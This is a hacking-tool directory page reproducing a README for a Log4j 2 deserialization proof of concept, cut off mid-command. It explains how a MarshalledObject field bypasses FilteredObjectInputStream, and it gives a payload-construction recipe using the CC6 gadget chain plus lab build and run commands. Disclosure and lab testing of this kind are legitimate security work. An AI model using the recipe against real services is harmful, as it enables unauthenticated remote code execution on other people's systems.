---
title: log4j2-rce
url: https://kitploit.com/en/tools/github/hypnguyen1209/log4j2-rce
source: Kitploit
date: 2026-08-27
fetch_date: 2026-08-28T13:36:35.792998
---

# log4j2-rce

[Skip to content](#main-content)

[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories

EN

[Submit](/en/submit)

[Tools](/en/tools)[Blog](/en/blog)Categories

[Submit](/en/submit)

EN

Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!

Kitploit is a directory of hacking, cybersecurity, and pentesting tools. Discover the latest project updates to find vulnerabilities, analyze systems, automate testing, and strengthen your security.

·Analytics preferences·[Feeds](/en/feeds)·[Contact](/en/contact)·[Privacy](/en/privacy)·© 2026 Kitploit

Tool Directory

## Categories

[View all categories](/en/categories)

Loading categories

[Tools](/en/tools)/![GitHub](/providers/github.png)GitHub/hypnguyen1209/log4j2-rce

![](https://assets.kitploit.com/production/public/tools/53355/0c4a8418ae88ae84f0654cc2fa4420d3241c04edd8a98f85c9225c12b94be527-display-v1.webp)

[Vulnerability Analysis](/en/categories/vulnerability-analysis)[Exploitation](/en/categories/exploitation)[Web Application Exploitation](/en/categories/web-application-exploitation)[Payload Development](/en/categories/payload-development)[Binary Exploitation](/en/categories/binary-exploitation)

![GitHub](/providers/github.png)hypnguyen1209/log4j2-rce

# log4j2-rce

Pre-auth RCE via FilteredObjectInputStream MarshalledObject bypass in Apache Log4j 2

[View Repository](https://github.com/hypnguyen1209/log4j2-rce)

195421 day ago![Not yet reviewed](/_next/image?url=%2Fbadges%2Fkitploit_badge_not_reviewed_full.png&w=48&q=75)

### Most Popular

[View all →](/en/tools)

Discover the most used tools by our community.

Last 7 DaysLast 30 Days

Explore all tools

Browse our collection of tools

[View all tools →](/en/tools)

Share

# Log4j FilteredObjectInputStream Bypass

Pre-auth RCE on any Java service that deserializes `LogEvent` through Log4j's `FilteredObjectInputStream`. No credentials needed.

Reported as [GitHub issue #4255](https://github.com/apache/logging-log4j2/issues/4255) on August 24, 2026.

## What it does

Log4j ships `FilteredObjectInputStream` (FOIS) as a safe deserialization wrapper. It overrides `resolveClass()` with an allowlist so only `org.apache.logging.log4j.*`, `java.lang.*`, `java.util.*`, and a few explicit classes can pass through.

One of those explicit classes is `java.rmi.MarshalledObject`:

root@kitploit:~

```
// SerializationUtil.java:81
public static final List<String> REQUIRED_JAVA_CLASSES = Arrays.asList(
        "java.math.BigDecimal",
        "java.math.BigInteger",
        "java.rmi.MarshalledObject",   // <-- the problem
        ...);
```

`MarshalledObject.get()` creates a **new, plain `ObjectInputStream`** internally. No filter. Anything wrapped inside a `MarshalledObject` deserializes with zero restrictions, completely bypassing the allowlist.

Log4j itself does this wrapping. `LogEventProxy` (the serialization proxy for every `LogEvent`) stores the event message in a `MarshalledObject<Message>` field. On deserialization, it calls `marshalledMessage.get()` to recover the message. That call creates the unfiltered stream. Game over.

## How FOIS gets bypassed

The filter only sees top-level class descriptors in the stream:

root@kitploit:~

```
// FilteredObjectInputStream.java:66-72
@Override
protected Class<?> resolveClass(ObjectStreamClass desc)
        throws IOException, ClassNotFoundException {
    String name = SerializationUtil.stripArray(desc.getName());
    if (!(isAllowedByDefault(name) || allowedExtraClasses.contains(name))) {
        throw new InvalidObjectException(
            "Class is not allowed for deserialization: " + name);
    }
    return super.resolveClass(desc);
}
```

FOIS checks `LogEventProxy` (log4j package, allowed), `MarshalledObject` (in the allowlist), and `byte[]` (primitive). All pass. The CC6 gadget chain is hidden inside `MarshalledObject.objBytes` as raw bytes. FOIS never sees it.

When `LogEventProxy.readResolve()` runs:

root@kitploit:~

```
// Log4jLogEvent.java:1265-1274
private Message message() {
    if (marshalledMessage != null) {
        try {
            return marshalledMessage.get();   // unfiltered ObjectInputStream
        } catch (final Exception ex) {
            // ignore me
        }
    }
    return new SimpleMessage(messageString);
}
```

`marshalledMessage.get()` creates a plain `ObjectInputStream`, the CC6 chain triggers, and the command executes. The catch block swallows the `ClassCastException` when the gadget result isn't a `Message`, so the server responds normally. No error, no log entry.

For comparison, `ObjectMessage` does it correctly:

root@kitploit:~

```
// ObjectMessage.java:132-136
private void readObject(ObjectInputStream in) throws ... {
    in.defaultReadObject();
    obj = SerializationUtil.readWrappedObject(in);  // creates a FILTERED inner stream
}
```

`LogEventProxy` should use this same pattern but doesn't.

## How the attack works

root@kitploit:~

```
Attacker                                   Target (FOIS-based receiver)
   |                                              |
   |  HTTP POST /log                              |
   |  Body: serialized LogEventProxy              |
   |  ------------------------------------------> |
   |                                              |
   |                 FilteredObjectInputStream.readObject()
   |                   ├── resolveClass(LogEventProxy)     ✓ log4j package
   |                   ├── resolveClass(MarshalledObject)  ✓ allowlist
   |                   └── resolveClass(byte[])            ✓ primitive
   |                         |
   |                 LogEventProxy.readResolve()
   |                   └── message()
   |                       └── marshalledMessage.get()
   |                           └── new ObjectInputStream(objBytes)   NO FILTER
   |                               └── HashSet.readObject()          CC6
   |                                   └── TiedMapEntry.hashCode()
   |                                       └── LazyMap.get()
   |                                           └── ChainedTransformer
   |                                               └── Runtime.exec(cmd)
   |                                              |
   |  HTTP 200 OK: "log event"                    |
   |  <------------------------------------------ |
```

The server responds 200 and processes the event as if nothing happened.

## Payload construction

The trick is getting the CC6 chain inside `MarshalledObject.objBytes` without it triggering early.

`GadgetMessage` implements `Message` and overrides `writeReplace()` to return the CC6 gadget:

1. Build a `Log4jLogEvent` with `GadgetMessage` as its message.
2. Serialize it. `LogEventProxy.writeObject()` calls `marshall(message)`, which feeds `GadgetMessage` into the `MarshalledObject` constructor.
3. The constructor serializes `GadgetMessage`. `writeReplace()` fires and substitutes the CC6 `HashSet`.
4. Now `MarshalledObject.objBytes` contains the CC6 chain. `GadgetMessage` never appears on the wire.

`GadgetMessage` is attacker-side only. It doesn't need to be on the target classpath.

## Affected versions

| Component | Vulnerable |
| --- | --- |
| `log4j-api` (FilteredObjectInputStream) | 2.11.0 to 2.24.3 |
| `log4j-core` (LogEventProxy MarshalledObject field) | 2.8.0 to 2.24.3 |

Target also needs a gadget library on the classpath. This PoC uses Commons Collections 3.2.1 (CC6 chain).

## Running it

Requirements: Java 11+, Maven, Python 3.10+, Docker (victim lab only)

Build and start the victim:

root@kitploit:~

```
cd lab
docker build -t fois-bypass-lab .
docker run -d --name fois-lab -p 8000:8000 fois-bypass-lab
cd ..
```

Build the exploit (or let `poc.py` do it on first run):

root@kitploit:~

```
cd exploit && mvn package -q -DskipTests && cd ..
```

Run:

root@kitploit:~

```
# --lhost is your IP reachable from the target
# for Docker lab on the same host, use the docker0 bridge IP
python3 poc.py -u http://127.0.0....